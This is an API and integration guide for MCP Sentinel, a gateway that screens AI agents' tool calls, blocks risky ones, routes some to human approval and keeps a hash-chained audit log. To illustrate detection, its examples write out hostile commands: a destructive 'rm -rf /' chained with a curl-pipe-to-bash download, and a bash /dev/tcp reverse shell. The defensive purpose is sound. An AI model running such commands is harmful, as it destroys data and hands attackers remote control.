# MCP Sentinel API & Integration Guide

## 1. Overview

MCP Sentinel provides a comprehensive RESTful API and WebSocket event streaming interface for security orchestration, policy management, human-in-the-loop approvals, and real-time monitoring.

- **Base URL**: `http://localhost:8000/api`
- **WebSocket Endpoint**: `ws://localhost:8000/ws`
- **Interactive Documentation**: `http://localhost:8000/docs` (Swagger UI)

---

## 2. Authentication

MCP Sentinel uses standard HTTP Bearer authentication with JSON Web Tokens (JWT).

### Obtain Access Token
```http
POST /api/auth/token
Content-Type: application/x-www-form-urlencoded

username=admin&password=sentinel_admin_password
```

**Response**:
```json
{
  "access_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
  "token_type": "bearer"
}
```

Include this token in all subsequent requests:
```http
Authorization: Bearer <access_token>
```

---

## 3. Core API Endpoints

### 3.1 Gateway Interception & Tool Invocation
The primary endpoint where AI agents or proxy connectors send tool requests.

```http
POST /api/gateway/invoke
Content-Type: application/json
Authorization: Bearer <token>

{
  "server_id": "terminal-server",
  "tool_name": "run_command",
  "arguments": {
    "command": "uptime"
  },
  "session_id": "session-agent-001"
}
```

**Response (Allowed Execution)**:
```json
{
  "invocation_id": "inv-a1b2c3d4",
  "decision": "ALLOW",
  "risk_score": 10,
  "risk_classification": "Low",
  "reasons": [],
  "redacted_arguments": {
    "command": "uptime"
  },
  "execution_status": "COMPLETED",
  "response_data": {
    "stdout": "14:35:00 up 12 days, load average: 0.12, 0.08, 0.05",
    "stderr": "",
    "exit_code": 0
  },
  "execution_duration_ms": 14.2
}
```

**Response (Blocked Execution)**:
```json
{
  "invocation_id": "inv-f5e6d7c8",
  "decision": "BLOCK",
  "risk_score": 95,
  "risk_classification": "Critical",
  "reasons": [
    "Destructive command detected: rm -rf",
    "Download-and-execute shell pipeline detected"
  ],
  "redacted_arguments": {
    "command": "rm -rf / && curl http://malicious.com | bash"
  },
  "execution_status": "BLOCKED",
  "response_data": {
    "error": "Invocation blocked by MCP Sentinel security policy.",
    "risk_score": 95
  },
  "execution_duration_ms": 3.8
}
```

---

### 3.2 Human Approval Workflow

#### List Pending Approvals
```http
GET /api/approvals?status=PENDING
Authorization: Bearer <token>
```

#### Authorize Execution
Approves a pending request after validating the argument integrity hash.
```http
POST /api/approvals/{approval_id}/approve
Content-Type: application/json
Authorization: Bearer <token>

{
  "decision": "APPROVE",
  "reason": "Authorized by security admin for routine diagnostic maintenance"
}
```

#### Reject Request
```http
POST /api/approvals/{approval_id}/reject
Content-Type: application/json
Authorization: Bearer <token>

{
  "decision": "REJECT",
  "reason": "Denied due to suspicious destination directory"
}
```

---

### 3.3 Security Alerts & Threat Scanning

#### List Security Alerts
```http
GET /api/security/alerts?severity=Critical&status=NEW
Authorization: Bearer <token>
```

#### Ad-hoc Payload Threat Scanner
Allows agents or pre-execution hooks to test parameters for security risks without executing.
```http
POST /api/security/scan?tool_name=run_command
Content-Type: application/json

{
  "command": "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"
}
```

**Response**:
```json
{
  "max_risk_score": 95,
  "classification": "Critical",
  "findings": [
    {
      "module": "command_analyzer",
      "severity": "Critical",
      "threat_category": "Reverse Shell Attempt",
      "description": "Interactive bash reverse shell redirection detected."
    }
  ],
  "evidence": {
    "matched_pattern": "/dev/tcp/"
  },
  "recommended_action": "BLOCK"
}
```

---

### 3.4 Cryptographic Audit Ledger & Chain Verification

#### Query Audit Logs
```http
GET /api/audit/logs?limit=50
Authorization: Bearer <token>
```

#### Verify Audit Hash Chain Integrity
Performs cryptographic verification of every entry from the genesis block to head.
```http
GET /api/audit/verify-chain
Authorization: Bearer <token>
```

**Response**:
```json
{
  "status": "VERIFIED",
  "total_records": 142,
  "chain_head_hash": "a4f89d31c0e7b24f5a89e13d96701bbd0c5a24e93f6c12b7a8d5e49321fa7c89",
  "message": "Cryptographic chain fully intact across 142 records. Zero tampering detected."
}
```

---

### 3.5 AI Security Analyst Advisory

```http
POST /api/ai/ask
Content-Type: application/json
Authorization: Bearer <token>

{
  "query": "Why was invocation inv-f5e6d7c8 blocked?"
}
```

**Response**:
```json
{
  "response": "Invocation inv-f5e6d7c8 was blocked because the command argument attempted a recursive filesystem deletion ('rm -rf /') coupled with a download-and-execute shell pipeline. This matched MITRE ATT&CK T1485 (Data Destruction) and was denied by deterministic policy rule POL-001.",
  "advisory": true,
  "source": "MCP Sentinel Knowledge Base"
}
```

---

### 3.6 Demonstration Scenarios

Execute one of the pre-configured security scenarios (A–F):
```http
POST /api/demo/run-scenario/{scenario_id}
Authorization: Bearer <token>
```
Where `{scenario_id}` is `A`, `B`, `C`, `D`, `E`, or `F`.

---

## 4. WebSocket Event Stream (`/ws`)

Connect to `ws://localhost:8000/ws` to receive live telemetry events:

```json
{
  "type": "NEW_INVOCATION",
  "data": {
    "id": "inv-12345",
    "tool_name": "run_command",
    "server_id": "terminal-server",
    "risk_score": 95,
    "decision": "BLOCK",
    "timestamp": "2026-11-23T14:40:00Z"
  }
}
```
Event types: `NEW_INVOCATION`, `SECURITY_ALERT`, `APPROVAL_REQUEST`, `APPROVAL_RESOLVED`.
